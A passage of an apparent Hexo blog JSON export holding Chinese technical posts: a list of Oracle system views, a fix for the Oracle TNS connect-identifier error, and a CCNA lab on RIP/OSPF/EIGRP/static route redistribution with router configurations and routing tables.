/>&nbsp;<br />&nbsp;v$开头 &nbsp;<br />&nbsp;v$database&nbsp;&nbsp; 数据库信息 &nbsp;<br />&nbsp;v$datafile&nbsp; 数据文件信息 &nbsp;<br />&nbsp;v$controlfile控制文件信息&nbsp; &nbsp;<br />&nbsp;v$logfile&nbsp; 重做日志信息&nbsp; &nbsp;<br />&nbsp;v$instance&nbsp; 数据库实例信息 &nbsp;<br />&nbsp;v$log&nbsp; 日志组信息&nbsp; &nbsp;<br />&nbsp;v$loghist 日志历史信息&nbsp; &nbsp;<br />&nbsp;v$sga&nbsp; 数据库SGA信息&nbsp; &nbsp;<br />&nbsp;v$parameter 初始化参数信息 &nbsp;<br />&nbsp;v$process&nbsp; 数据库服务器进程信息&nbsp; &nbsp;<br />&nbsp;v$bgprocess&nbsp; 数据库后台进程信息 &nbsp;<br />&nbsp;v$controlfile_record_section&nbsp; 控制文件记载的各部分信息 <br />&nbsp;v$thread&nbsp; 线程信息&nbsp; &nbsp;<br />&nbsp;v$datafile_header&nbsp; 数据文件头所记载的信息&nbsp; &nbsp;<br />&nbsp;v$archived_log归档日志信息 &nbsp;<br />&nbsp;v$archive_dest&nbsp; 归档日志的设置信息&nbsp; &nbsp;<br />&nbsp;v$logmnr_contents&nbsp; 归档日志分析的DML DDL结果信息&nbsp; &nbsp;<br />&nbsp;v$logmnr_dictionary&nbsp; 日志分析的字典文件信息 &nbsp;<br />&nbsp;v$logmnr_logs&nbsp; 日志分析的日志列表信息&nbsp; &nbsp;<br />&nbsp;v$tablespace&nbsp; 表空间信息 &nbsp;<br />&nbsp;v$tempfile&nbsp; 临时文件信息&nbsp; &nbsp;<br />&nbsp;v$filestat&nbsp; 数据文件的I/O统计信息&nbsp; &nbsp;<br />&nbsp;v$undostat&nbsp; Undo数据信息&nbsp; &nbsp;<br />&nbsp;v$rollname&nbsp; 在线回滚段信息 &nbsp;<br />&nbsp;v$session&nbsp; 会话信息 &nbsp;<br />&nbsp;v$transaction 事务信息&nbsp; &nbsp;<br />&nbsp;v$rollstat&nbsp;&nbsp; 回滚段统计信息&nbsp; &nbsp;<br />&nbsp;v$pwfile_users&nbsp; 特权用户信息 &nbsp;<br />&nbsp;v$sqlarea&nbsp;&nbsp;&nbsp; 当前查询过的sql语句访问过的资源及相关的信息&nbsp; &nbsp;<br />&nbsp;v$sql&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 与v$sqlarea基本相同的相关信息&nbsp; &nbsp;<br />&nbsp;v$sysstat&nbsp;&nbsp; 数据库系统状态信息<br />&nbsp;<br />&nbsp;all_开头&nbsp; &nbsp;<br />&nbsp;all_users&nbsp; 数据库所有用户的信息&nbsp; &nbsp;<br />&nbsp;all_objects&nbsp; 数据库所有的对象的信息&nbsp; &nbsp;<br />&nbsp;all_def_audit_opts&nbsp; 所有默认的审计设置信息&nbsp; &nbsp;<br />&nbsp;all_tables&nbsp; 所有的表对象信息&nbsp; &nbsp;<br />&nbsp;all_indexes所有的数据库对象索引的信息<br />&nbsp;<br />&nbsp;session_开头&nbsp; &nbsp;<br />session_roles&nbsp;&nbsp; 会话的角色信息 &nbsp;<br />&nbsp;session_privs&nbsp;&nbsp; 会话的权限信息<br />&nbsp;<br />&nbsp;index_开头&nbsp; &nbsp;<br />&nbsp;index_stats&nbsp; 索引的设置和存储信息伪表 &nbsp;<br />&nbsp;<br />&nbsp;dual&nbsp; 系统伪列表信息","slug":"oracle-一些系统表","published":1,"updated":"2023-04-22T05:38:44.865Z","_id":"clgrjlxij005g7opid1cnbx6a","comments":1,"layout":"post","photos":[],"link":"","content":"<p>dba_开头 <br />dba_users&amp;nbsp;&amp;nbsp;&amp;nbsp; 数据库用户信息&amp;nbsp; &amp;nbsp;<br />dba_segments 表段信息&amp;nbsp; &amp;nbsp;<br />dba_extents&amp;nbsp;&amp;nbsp; 数据区信息&amp;nbsp; &amp;nbsp;<br />dba_objects&amp;nbsp;&amp;nbsp; 数据库对象信息&amp;nbsp; &amp;nbsp;<br />dba_tablespaces&amp;nbsp; 数据库表空间信息&amp;nbsp; &amp;nbsp;<br />dba_data_files&amp;nbsp;&amp;nbsp; 数据文件设置信息&amp;nbsp; &amp;nbsp;<br />dba_temp_files&amp;nbsp; 临时数据文件信息&amp;nbsp; &amp;nbsp;<br />dba_rollback_segs&amp;nbsp; 回滚段信息&amp;nbsp; &amp;nbsp;<br />dba_ts_quotas&amp;nbsp; 用户表空间配额信息&amp;nbsp; &amp;nbsp;<br />dba_free_space数据库空闲空间信息&amp;nbsp; &amp;nbsp;<br />dba_profiles&amp;nbsp; 数据库用户资源限制信息&amp;nbsp; &amp;nbsp;<br />dba_sys_privs&amp;nbsp; 用户的系统权限信息&amp;nbsp; &amp;nbsp;<br />dba_tab_privs用户具有的对象权限信息&amp;nbsp; &amp;nbsp;<br />dba_col_privs用户具有的列对象权限信息&amp;nbsp; &amp;nbsp;<br />dba_role_privs用户具有的角色信息&amp;nbsp; &amp;nbsp;<br />dba_audit_trail审计跟踪记录信息&amp;nbsp; &amp;nbsp;<br />dba_stmt_audit_opts审计设置信息&amp;nbsp; &amp;nbsp;<br />dba_audit_object&amp;nbsp; 对象审计结果信息&amp;nbsp; &amp;nbsp;<br />dba_audit_session会话审计结果信息&amp;nbsp; &amp;nbsp;<br />dba_indexes用户模式的索引信息<br /><br />user_开头&amp;nbsp; &amp;nbsp;<br />user_objects&amp;nbsp; 用户对象信息&amp;nbsp; &amp;nbsp;<br />user_source&amp;nbsp; 数据库用户的所有资源对象信息&amp;nbsp; &amp;nbsp;<br />user_segments&amp;nbsp; 用户的表段信息&amp;nbsp; &amp;nbsp;<br />user_tables&amp;nbsp;&amp;nbsp; 用户的表对象信息&amp;nbsp; &amp;nbsp;<br />user_tab_columns&amp;nbsp; 用户的表列信息&amp;nbsp; &amp;nbsp;<br />user_constraints&amp;nbsp; 用户的对象约束信息&amp;nbsp; &amp;nbsp;<br />user_sys_privs&amp;nbsp; 当前用户的系统权限信息&amp;nbsp; &amp;nbsp;<br />user_tab_privs&amp;nbsp; 当前用户的对象权限信息&amp;nbsp; &amp;nbsp;<br />user_col_privs&amp;nbsp; 当前用户的表列权限信息&amp;nbsp; &amp;nbsp;<br />user_role_privs&amp;nbsp; 当前用户的角色权限信息&amp;nbsp; &amp;nbsp;<br />user_indexes&amp;nbsp; 用户的索引信息&amp;nbsp; &amp;nbsp;<br />user_ind_columns用户的索引对应的表列信息&amp;nbsp; &amp;nbsp;<br />user_cons_columns&amp;nbsp; 用户的约束对应的表列信息&amp;nbsp; &amp;nbsp;<br />user_clusters&amp;nbsp; 用户的所有簇信息&amp;nbsp; &amp;nbsp;<br />user_clu_columns 用户的簇所包含的内容信息 &amp;nbsp;<br />user_cluster_hash_expressions&amp;nbsp;&amp;nbsp; 散列簇的信息<br />&amp;nbsp;<br />&amp;nbsp;v$开头 &amp;nbsp;<br />&amp;nbsp;v$database&amp;nbsp;&amp;nbsp; 数据库信息 &amp;nbsp;<br />&amp;nbsp;v$datafile&amp;nbsp; 数据文件信息 &amp;nbsp;<br />&amp;nbsp;v$controlfile控制文件信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$logfile&amp;nbsp; 重做日志信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$instance&amp;nbsp; 数据库实例信息 &amp;nbsp;<br />&amp;nbsp;v$log&amp;nbsp; 日志组信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$loghist 日志历史信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$sga&amp;nbsp; 数据库SGA信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$parameter 初始化参数信息 &amp;nbsp;<br />&amp;nbsp;v$process&amp;nbsp; 数据库服务器进程信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$bgprocess&amp;nbsp; 数据库后台进程信息 &amp;nbsp;<br />&amp;nbsp;v$controlfile_record_section&amp;nbsp; 控制文件记载的各部分信息 <br />&amp;nbsp;v$thread&amp;nbsp; 线程信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$datafile_header&amp;nbsp; 数据文件头所记载的信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$archived_log归档日志信息 &amp;nbsp;<br />&amp;nbsp;v$archive_dest&amp;nbsp; 归档日志的设置信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$logmnr_contents&amp;nbsp; 归档日志分析的DML DDL结果信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$logmnr_dictionary&amp;nbsp; 日志分析的字典文件信息 &amp;nbsp;<br />&amp;nbsp;v$logmnr_logs&amp;nbsp; 日志分析的日志列表信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$tablespace&amp;nbsp; 表空间信息 &amp;nbsp;<br />&amp;nbsp;v$tempfile&amp;nbsp; 临时文件信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$filestat&amp;nbsp; 数据文件的I&#x2F;O统计信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$undostat&amp;nbsp; Undo数据信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$rollname&amp;nbsp; 在线回滚段信息 &amp;nbsp;<br />&amp;nbsp;v$session&amp;nbsp; 会话信息 &amp;nbsp;<br />&amp;nbsp;v$transaction 事务信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$rollstat&amp;nbsp;&amp;nbsp; 回滚段统计信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$pwfile_users&amp;nbsp; 特权用户信息 &amp;nbsp;<br />&amp;nbsp;v$sqlarea&amp;nbsp;&amp;nbsp;&amp;nbsp; 当前查询过的sql语句访问过的资源及相关的信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$sql&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 与v$sqlarea基本相同的相关信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$sysstat&amp;nbsp;&amp;nbsp; 数据库系统状态信息<br />&amp;nbsp;<br />&amp;nbsp;all_开头&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;all_users&amp;nbsp; 数据库所有用户的信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;all_objects&amp;nbsp; 数据库所有的对象的信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;all_def_audit_opts&amp;nbsp; 所有默认的审计设置信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;all_tables&amp;nbsp; 所有的表对象信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;all_indexes所有的数据库对象索引的信息<br />&amp;nbsp;<br />&amp;nbsp;session_开头&amp;nbsp; &amp;nbsp;<br />session_roles&amp;nbsp;&amp;nbsp; 会话的角色信息 &amp;nbsp;<br />&amp;nbsp;session_privs&amp;nbsp;&amp;nbsp; 会话的权限信息<br />&amp;nbsp;<br />&amp;nbsp;index_开头&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;index_stats&amp;nbsp; 索引的设置和存储信息伪表 &amp;nbsp;<br />&amp;nbsp;<br />&amp;nbsp;dual&amp;nbsp; 系统伪列表信息</p>\n","site":{"data":{}},"excerpt":"","more":"<p>dba_开头 <br />dba_users&amp;nbsp;&amp;nbsp;&amp;nbsp; 数据库用户信息&amp;nbsp; &amp;nbsp;<br />dba_segments 表段信息&amp;nbsp; &amp;nbsp;<br />dba_extents&amp;nbsp;&amp;nbsp; 数据区信息&amp;nbsp; &amp;nbsp;<br />dba_objects&amp;nbsp;&amp;nbsp; 数据库对象信息&amp;nbsp; &amp;nbsp;<br />dba_tablespaces&amp;nbsp; 数据库表空间信息&amp;nbsp; &amp;nbsp;<br />dba_data_files&amp;nbsp;&amp;nbsp; 数据文件设置信息&amp;nbsp; &amp;nbsp;<br />dba_temp_files&amp;nbsp; 临时数据文件信息&amp;nbsp; &amp;nbsp;<br />dba_rollback_segs&amp;nbsp; 回滚段信息&amp;nbsp; &amp;nbsp;<br />dba_ts_quotas&amp;nbsp; 用户表空间配额信息&amp;nbsp; &amp;nbsp;<br />dba_free_space数据库空闲空间信息&amp;nbsp; &amp;nbsp;<br />dba_profiles&amp;nbsp; 数据库用户资源限制信息&amp;nbsp; &amp;nbsp;<br />dba_sys_privs&amp;nbsp; 用户的系统权限信息&amp;nbsp; &amp;nbsp;<br />dba_tab_privs用户具有的对象权限信息&amp;nbsp; &amp;nbsp;<br />dba_col_privs用户具有的列对象权限信息&amp;nbsp; &amp;nbsp;<br />dba_role_privs用户具有的角色信息&amp;nbsp; &amp;nbsp;<br />dba_audit_trail审计跟踪记录信息&amp;nbsp; &amp;nbsp;<br />dba_stmt_audit_opts审计设置信息&amp;nbsp; &amp;nbsp;<br />dba_audit_object&amp;nbsp; 对象审计结果信息&amp;nbsp; &amp;nbsp;<br />dba_audit_session会话审计结果信息&amp;nbsp; &amp;nbsp;<br />dba_indexes用户模式的索引信息<br /><br />user_开头&amp;nbsp; &amp;nbsp;<br />user_objects&amp;nbsp; 用户对象信息&amp;nbsp; &amp;nbsp;<br />user_source&amp;nbsp; 数据库用户的所有资源对象信息&amp;nbsp; &amp;nbsp;<br />user_segments&amp;nbsp; 用户的表段信息&amp;nbsp; &amp;nbsp;<br />user_tables&amp;nbsp;&amp;nbsp; 用户的表对象信息&amp;nbsp; &amp;nbsp;<br />user_tab_columns&amp;nbsp; 用户的表列信息&amp;nbsp; &amp;nbsp;<br />user_constraints&amp;nbsp; 用户的对象约束信息&amp;nbsp; &amp;nbsp;<br />user_sys_privs&amp;nbsp; 当前用户的系统权限信息&amp;nbsp; &amp;nbsp;<br />user_tab_privs&amp;nbsp; 当前用户的对象权限信息&amp;nbsp; &amp;nbsp;<br />user_col_privs&amp;nbsp; 当前用户的表列权限信息&amp;nbsp; &amp;nbsp;<br />user_role_privs&amp;nbsp; 当前用户的角色权限信息&amp;nbsp; &amp;nbsp;<br />user_indexes&amp;nbsp; 用户的索引信息&amp;nbsp; &amp;nbsp;<br />user_ind_columns用户的索引对应的表列信息&amp;nbsp; &amp;nbsp;<br />user_cons_columns&amp;nbsp; 用户的约束对应的表列信息&amp;nbsp; &amp;nbsp;<br />user_clusters&amp;nbsp; 用户的所有簇信息&amp;nbsp; &amp;nbsp;<br />user_clu_columns 用户的簇所包含的内容信息 &amp;nbsp;<br />user_cluster_hash_expressions&amp;nbsp;&amp;nbsp; 散列簇的信息<br />&amp;nbsp;<br />&amp;nbsp;v$开头 &amp;nbsp;<br />&amp;nbsp;v$database&amp;nbsp;&amp;nbsp; 数据库信息 &amp;nbsp;<br />&amp;nbsp;v$datafile&amp;nbsp; 数据文件信息 &amp;nbsp;<br />&amp;nbsp;v$controlfile控制文件信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$logfile&amp;nbsp; 重做日志信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$instance&amp;nbsp; 数据库实例信息 &amp;nbsp;<br />&amp;nbsp;v$log&amp;nbsp; 日志组信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$loghist 日志历史信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$sga&amp;nbsp; 数据库SGA信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$parameter 初始化参数信息 &amp;nbsp;<br />&amp;nbsp;v$process&amp;nbsp; 数据库服务器进程信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$bgprocess&amp;nbsp; 数据库后台进程信息 &amp;nbsp;<br />&amp;nbsp;v$controlfile_record_section&amp;nbsp; 控制文件记载的各部分信息 <br />&amp;nbsp;v$thread&amp;nbsp; 线程信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$datafile_header&amp;nbsp; 数据文件头所记载的信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$archived_log归档日志信息 &amp;nbsp;<br />&amp;nbsp;v$archive_dest&amp;nbsp; 归档日志的设置信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$logmnr_contents&amp;nbsp; 归档日志分析的DML DDL结果信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$logmnr_dictionary&amp;nbsp; 日志分析的字典文件信息 &amp;nbsp;<br />&amp;nbsp;v$logmnr_logs&amp;nbsp; 日志分析的日志列表信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$tablespace&amp;nbsp; 表空间信息 &amp;nbsp;<br />&amp;nbsp;v$tempfile&amp;nbsp; 临时文件信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$filestat&amp;nbsp; 数据文件的I&#x2F;O统计信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$undostat&amp;nbsp; Undo数据信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$rollname&amp;nbsp; 在线回滚段信息 &amp;nbsp;<br />&amp;nbsp;v$session&amp;nbsp; 会话信息 &amp;nbsp;<br />&amp;nbsp;v$transaction 事务信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$rollstat&amp;nbsp;&amp;nbsp; 回滚段统计信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$pwfile_users&amp;nbsp; 特权用户信息 &amp;nbsp;<br />&amp;nbsp;v$sqlarea&amp;nbsp;&amp;nbsp;&amp;nbsp; 当前查询过的sql语句访问过的资源及相关的信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$sql&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 与v$sqlarea基本相同的相关信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;v$sysstat&amp;nbsp;&amp;nbsp; 数据库系统状态信息<br />&amp;nbsp;<br />&amp;nbsp;all_开头&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;all_users&amp;nbsp; 数据库所有用户的信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;all_objects&amp;nbsp; 数据库所有的对象的信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;all_def_audit_opts&amp;nbsp; 所有默认的审计设置信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;all_tables&amp;nbsp; 所有的表对象信息&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;all_indexes所有的数据库对象索引的信息<br />&amp;nbsp;<br />&amp;nbsp;session_开头&amp;nbsp; &amp;nbsp;<br />session_roles&amp;nbsp;&amp;nbsp; 会话的角色信息 &amp;nbsp;<br />&amp;nbsp;session_privs&amp;nbsp;&amp;nbsp; 会话的权限信息<br />&amp;nbsp;<br />&amp;nbsp;index_开头&amp;nbsp; &amp;nbsp;<br />&amp;nbsp;index_stats&amp;nbsp; 索引的设置和存储信息伪表 &amp;nbsp;<br />&amp;nbsp;<br />&amp;nbsp;dual&amp;nbsp; 系统伪列表信息</p>\n"},{"title":"oracle TNS：无法解析指定的连接标识符！！","date":"2012-03-02T08:32:00.000Z","_content":"<p>用sqlplus 连接数据库，提示这个错误。</p><p>原因两个问题</p><p>&nbsp;</p><p>1. sid问题，sid最多为8位。</p><p>2.tns 是否监听</p><p>&nbsp;</p><p>可以看一下这个文件</p><p>network/admin/tnsnames.ora</p><p>例如；</p><p>ORCL =<br />&nbsp; (DESCRIPTION =<br />&nbsp;&nbsp;&nbsp; (ADDRESS = (PROTOCOL = TCP)(HOST = 19f9014c5ca444d)(PORT = 1521))<br />&nbsp;&nbsp;&nbsp; (CONNECT_DATA =<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SERVER = DEDICATED)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SERVICE_NAME = orcl)<br />&nbsp;&nbsp;&nbsp; )<br />&nbsp; )</p><p><br />这里面写的清清楚楚。再netstat -an 一下看看端口。相信你懂的。</p>","source":"_posts/oracle-TNS：无法解析指定的连接标识符！！.md","raw":"title: oracle TNS：无法解析指定的连接标识符！！\ncategories: [Linux]\ntags: []\ndate: 2012-03-02 16:32:00\n---\n<p>用sqlplus 连接数据库，提示这个错误。</p><p>原因两个问题</p><p>&nbsp;</p><p>1. sid问题，sid最多为8位。</p><p>2.tns 是否监听</p><p>&nbsp;</p><p>可以看一下这个文件</p><p>network/admin/tnsnames.ora</p><p>例如；</p><p>ORCL =<br />&nbsp; (DESCRIPTION =<br />&nbsp;&nbsp;&nbsp; (ADDRESS = (PROTOCOL = TCP)(HOST = 19f9014c5ca444d)(PORT = 1521))<br />&nbsp;&nbsp;&nbsp; (CONNECT_DATA =<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SERVER = DEDICATED)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SERVICE_NAME = orcl)<br />&nbsp;&nbsp;&nbsp; )<br />&nbsp; )</p><p><br />这里面写的清清楚楚。再netstat -an 一下看看端口。相信你懂的。</p>","slug":"oracle-TNS：无法解析指定的连接标识符！！","published":1,"updated":"2023-04-22T05:38:44.863Z","_id":"clgrjlxil005i7opi9fyehvzj","comments":1,"layout":"post","photos":[],"link":"","content":"<p>用sqlplus 连接数据库，提示这个错误。</p><p>原因两个问题</p><p>&nbsp;</p><p>1. sid问题，sid最多为8位。</p><p>2.tns 是否监听</p><p>&nbsp;</p><p>可以看一下这个文件</p><p>network/admin/tnsnames.ora</p><p>例如；</p><p>ORCL =<br />&nbsp; (DESCRIPTION =<br />&nbsp;&nbsp;&nbsp; (ADDRESS = (PROTOCOL = TCP)(HOST = 19f9014c5ca444d)(PORT = 1521))<br />&nbsp;&nbsp;&nbsp; (CONNECT_DATA =<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SERVER = DEDICATED)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SERVICE_NAME = orcl)<br />&nbsp;&nbsp;&nbsp; )<br />&nbsp; )</p><p><br />这里面写的清清楚楚。再netstat -an 一下看看端口。相信你懂的。</p>","site":{"data":{}},"excerpt":"","more":"<p>用sqlplus 连接数据库，提示这个错误。</p><p>原因两个问题</p><p>&nbsp;</p><p>1. sid问题，sid最多为8位。</p><p>2.tns 是否监听</p><p>&nbsp;</p><p>可以看一下这个文件</p><p>network/admin/tnsnames.ora</p><p>例如；</p><p>ORCL =<br />&nbsp; (DESCRIPTION =<br />&nbsp;&nbsp;&nbsp; (ADDRESS = (PROTOCOL = TCP)(HOST = 19f9014c5ca444d)(PORT = 1521))<br />&nbsp;&nbsp;&nbsp; (CONNECT_DATA =<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SERVER = DEDICATED)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SERVICE_NAME = orcl)<br />&nbsp;&nbsp;&nbsp; )<br />&nbsp; )</p><p><br />这里面写的清清楚楚。再netstat -an 一下看看端口。相信你懂的。</p>"},{"title":"OSPF、EIGRP、RIP、静态路由的重分布实验","date":"2010-03-22T12:43:00.000Z","_content":"快毕业了，该复习了。今天没事无聊，开了这个博客，写点东西吧。<br /><br />网路拓扑图如下：<br /><br /><img src=\"/images/pic/96e6d3efba3d601162d09fc5.jpg\" small=\"0\" /><br /><br />因为是用工大瑞普模拟器做的CCNA路由版，就这么多路由器。主要是熟悉命令。<br /><br />路由器配置如下（为了空间问题，显示主要的）：<br />R1：<br /><br />interface Loopback0<br />ip address 1.1.1.1 255.255.255.0<br />!<br />interface Ethernet1/0<br />ip address 192.168.1.1 255.255.255.0<br />!<br />interface Ethernet1/1<br />no ip address<br />shutdown<br />!<br />interface Ethernet1/2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1/3<br />no ip address<br />shutdown<br />!<br />router rip<br />network 1.0.0.0<br />network 192.168.1.0<br />!<br /><br />R2：<br /><br />interface FastEthernet0/0<br />ip address 192.168.1.2 255.255.255.0<br />duplex auto<br />speed auto<br />!<br />interface FastEthernet0/1<br />ip address 192.168.2.1 255.255.255.0<br />duplex auto<br />speed auto<br />!<br />router ospf 1<br />log-adjacency-changes<br />redistribute rip subnets<br />network 192.168.2.0 0.0.0.255 area 0<br />!<br />router rip<br />redistribute ospf 1<br />network 192.168.1.0<br />default-metric 2<br />!<br /><br />R3：<br /><br />interface Ethernet1/0<br />ip address 192.168.2.2 255.255.255.0<br />!<br />interface Ethernet1/1<br />ip address 192.168.3.1 255.255.255.0<br />!<br />interface Ethernet1/2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1/3<br />no ip address<br />shutdown<br />!<br />router eigrp 1<br />redistribute ospf 1<br />network 192.168.3.0<br />default-metric 1000 10 1 255 1500<br />no eigrp log-neighbor-changes<br />!<br />router ospf 1<br />log-adjacency-changes<br />redistribute eigrp 1 subnets<br />network 192.168.2.0 0.0.0.255 area 0<br />!<br /><br />R4:<br /><br />interface Ethernet1/0<br />ip address 192.168.3.2 255.255.255.0<br />!<br />interface Ethernet1/1<br />ip address 192.168.4.1 255.255.255.0<br />!<br />interface Ethernet1/2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1/3<br />no ip address<br />shutdown<br />!<br />router eigrp 1<br />redistribute static<br />network 192.168.3.0<br />network 192.168.4.0<br />default-metric 1000 10 1 255 1500<br />no eigrp log-neighbor-changes<br />!<br />ip classless<br />ip route 2.2.2.0 255.255.255.0 192.168.4.2<br />no ip http server<br />!<br /><br />R5:<br /><br />interface Loopback0<br />ip address 2.2.2.2 255.255.255.0<br />!<br />interface FastEthernet0/0<br />ip address 192.168.4.2 255.255.255.0<br />duplex auto<br />speed auto<br />!<br />interface FastEthernet0/1<br />no ip address<br />shutdown<br />duplex auto<br />speed auto<br />!<br />ip classless<br />ip route 1.1.1.0 255.255.255.0 192.168.4.1<br />ip route 192.168.1.0 255.255.255.0 192.168.4.1<br />ip route 192.168.2.0 255.255.255.0 192.168.4.1<br />ip route 192.168.3.0 255.255.255.0 192.168.4.1<br />no ip http server<br />!<br /><br />路由表情况。<br /><br />R1:<br />R1#SH IP ROute<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0/24 is subnetted, 1 subnets<br />C&#160;&#160;&#160;&#160;&#160;&#160; 1.1.1.0 is directly connected, Loopback0<br />R&#160;&#160;&#160; 2.0.0.0/8 [120/2] via 192.168.1.2, 00:00:15, Ethernet1/0<br />R&#160;&#160;&#160; 192.168.4.0/24 [120/2] via 192.168.1.2, 00:00:15, Ethernet1/0<br />C&#160;&#160;&#160; 192.168.1.0/24 is directly connected, Ethernet1/0<br />R&#160;&#160;&#160; 192.168.2.0/24 [120/2] via 192.168.1.2, 00:00:15, Ethernet1/0<br />R&#160;&#160;&#160; 192.168.3.0/24 [120/2] via 192.168.1.2, 00:00:15, Ethernet1/0<br /><br />R2：<br /><br />R2#sh ip route<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />R&#160;&#160;&#160; 1.0.0.0/8 [120/1] via 192.168.1.1, 00:00:15, FastEthernet0/0<br />2.0.0.0/24 is subnetted, 1 subnets<br />O E2&#160;&#160;&#160; 2.2.2.0 [110/20] via 192.168.2.2, 00:22:20, FastEthernet0/1<br />O E2 192.168.4.0/24 [110/20] via 192.168.2.2, 00:22:20, FastEthernet0/1<br />C&#160;&#160;&#160; 192.168.1.0/24 is directly connected, FastEthernet0/0<br />C&#160;&#160;&#160; 192.168.2.0/24 is directly connected, FastEthernet0/1<br />O E2 192.168.3.0/24 [110/20] via 192.168.2.2, 00:22:20, FastEthernet0/1<br /><br />R3:<br /><br /><br />R3#SH IP ROute<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />O E2 1.0.0.0/8 [110/20] via 192.168.2.1, 00:21:47, Ethernet1/0<br />2.0.0.0/24 is subnetted, 1 subnets<br />D EX&#160;&#160;&#160; 2.2.2.0 [170/2588160] via 192.168.3.2, 00:32:31, Ethernet1/1<br />D&#160;&#160;&#160; 192.168.4.0/24 [90/307200] via 192.168.3.2, 00:32:31, Ethernet1/1<br />O E2 192.168.1.0/24 [110/20] via 192.168.2.1, 00:21:47, Ethernet1/0<br />C&#160;&#160;&#160; 192.168.2.0/24 is directly connected, Ethernet1/0<br />C&#160;&#160;&#160; 192.168.3.0/24 is directly connected, Ethernet1/1<br /><br /><br />R4:<br /><br />R4#SH IP ROute<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - 